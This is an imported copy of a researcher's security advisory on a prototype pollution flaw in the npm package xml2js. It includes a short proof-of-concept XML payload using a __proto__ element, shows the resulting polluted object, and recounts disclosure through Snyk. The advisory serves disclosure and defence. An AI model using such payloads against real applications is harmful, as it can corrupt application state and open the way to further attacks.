---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-14_prototype-pollution-in-xml2js.md
original_filename: 2023-04-14_prototype-pollution-in-xml2js.md
title: Prototype Pollution in xml2js
category: documents
detected_topics:
- supply-chain
- sso
- command-injection
tags:
- imported
- documents
- supply-chain
- sso
- command-injection
language: en
raw_sha256: 4ad607fd790566e1dacfaf477652444d96f50cd50e8163a60f64a5a313ec7a88
text_sha256: 8aef2ec27cfd82f81b564f785309ca83a6beda878889e129bc59f8def27e1713
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# Prototype Pollution in xml2js

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-14_prototype-pollution-in-xml2js.md
- Source Type: markdown
- Detected Topics: supply-chain, sso, command-injection
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `4ad607fd790566e1dacfaf477652444d96f50cd50e8163a60f64a5a313ec7a88`
- Text SHA256: `8aef2ec27cfd82f81b564f785309ca83a6beda878889e129bc59f8def27e1713`


## Content

---
title: "Prototype Pollution in xml2js"
page_title: "advisories/2023/npm-package/xml2js.md at main · Sudistark/advisories · GitHub"
url: "https://github.com/Sudistark/advisories/blob/main/2023/npm-package/xml2js.md"
final_url: "https://github.com/Sudistark/advisories/blob/main/2023/npm-package/xml2js.md"
authors: ["Sudhanshu Rajbhar (@sudhanshur705)"]
programs: ["xml2js"]
bugs: ["Prototype pollution"]
publication_date: "2023-04-14"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 1265
---

This package was also found to be vulnerable to the exact same vuln prototype pollution (fast-xml-parser). This one offers the same features like we have in fast-xml-parser, converting xml to js object.

<https://www.npmjs.com/package/xml2js>

[![image](https://user-images.githubusercontent.com/31372554/232061839-ea220cb5-8ba8-4fbc-89ea-6f97c7267437.png)](https://user-images.githubusercontent.com/31372554/232061839-ea220cb5-8ba8-4fbc-89ea-6f97c7267437.png)

Here are the details, the vulnerability is prototype pollution.

Taking an example code from the github repo to demonstrate the bug:
  
  
  var parseString = require('xml2js').parseString;
  var xml = "<__proto__><polluted>hacked</polluted></__proto__>"
  parseString(xml, function (err, result) {
  console.dir(result);
  });

In the attached screenshot you can see the `result` object was polluted with a new property.
  
  
  result
  >{}
  result.__proto__
  >{polluted: 'hacked'}
  result.__proto__.polluted
  >'hacked'

More information on prototype pollution can be found here: <https://learn.snyk.io/lessons/prototype-pollution/javascript/>

It was really hard to get in contact with the maintainer,so I took help of Snyk Vulnerability Disclosure (<https://snyk.io/vulnerability-disclosure/>). I forwarded them the details in the end of Feb 2023 and recived more information on 10 Apr

[![image](https://user-images.githubusercontent.com/31372554/232063590-87222517-f0ce-4864-af0e-b91baf9044ee.png)](https://user-images.githubusercontent.com/31372554/232063590-87222517-f0ce-4864-af0e-b91baf9044ee.png)

So it seems this was already reported by some other researcher way back in 2020 : <https://security.snyk.io/vuln/SNYK-JS-XML2JS-5414874>

[Leonidas-from-XIV/node-xml2js#593](https://github.com/Leonidas-from-XIV/node-xml2js/issues/593)
